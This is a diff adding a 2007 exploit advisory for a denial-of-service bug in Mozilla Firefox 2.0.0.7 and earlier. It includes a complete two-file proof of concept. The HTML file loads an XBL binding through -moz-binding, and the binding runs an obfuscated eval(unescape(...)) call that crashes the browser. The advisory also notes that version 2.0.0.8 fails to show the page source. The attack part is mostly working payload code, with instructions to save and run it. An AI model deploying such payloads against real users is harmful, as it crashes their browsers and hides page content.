@@ -1,0 +1,66 @@
+i######################### WwW.BugReport.ir #########################
+#
+#      AmnPardaz Security Research & Penetration Testing Group
+#
+# Bug Title: Mozilla Firefox 2.0.0.7 Denial of Service
+# Vendor URL: www.mozilla.org
+# Version: <= 2.0.0.7
+# Fix Available: Yes!
+# Soloution: Update to 2.0.0.8
+# Note: This bug works on 2.0.0.8 in different way. Although this bug doesn't crash 2.0.0.8, it causes not showing html code by viewing source in Mozilla Firefox 2.0.0.8 and this is another bug on 2.0.0.8!
+# Proof: http://www.astalavista.ir/proofs/MozillaFireFox/DoS1.htm
+#
+######################### WwW.AmnPardaz.com ########################
+#
+# Leaders : Shahin Ramezany & Sorush Dalili
+# Team Members: Amir Hossein Khonakdar, Hamid Farhadi
+# Security Site: WwW.BugReport.ir - WwW.AmnPardaz.Com
+# Country: Iran
+# Greetz To : Astalavista.ir (Secuiran.com) Security Research Group, GrayHatz.net
+# Contacts: <th3_vampire {4-t] yahoo [d-0-t} com> & <Irsdl {4-t] yahoo [d-0-t} com>
+# 
+######################## Bug Description ###########################
+#
+# To do this work we need 2 files (Html,XML).
+# Their codes was written below.
+#
+# Save below codes in a HTML file.
+#
+--------------------------------------------------------------------
+--------------------------------------------------------------------
+<html>
+	<head>
+		<style>BODY{-moz-binding:url("moz.xml#xss")}</style>
+	</head>
+	<body>
+		Suddenly see you baby! If you see this bug execution was failed!
+		<script>
+			alert('Soroush Dalili & Shahin Ramezani From Astalavista.ir')
+		</script>
+	</body>
+</html>
+--------------------------------------------------------------------
+--------------------------------------------------------------------
+#
+# Save below codes in "moz.xml" file.
+#
+--------------------------------------------------------------------
+--------------------------------------------------------------------
+<?xml version="1.0"?>
+<bindings xmlns="http://www.mozilla.org/xbl">
+  <binding id="xss">
+    <implementation>
+      <constructor><![CDATA[
+		eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%27%3c%61%3e%27%29'));		
+  	  ]]></constructor>
+    </implementation>
+  </binding>
+</bindings>
+--------------------------------------------------------------------
+--------------------------------------------------------------------
+#
+# Now by runnig the HTML file by Mozilla FireFox <= 2.0.0.7 it will be crashed and by Mozilla FireFox 2.0.0.8 no code will be showed by viewing the source.
+#
+###################################################################
+
+# milw0rm.com [2007-10-22]
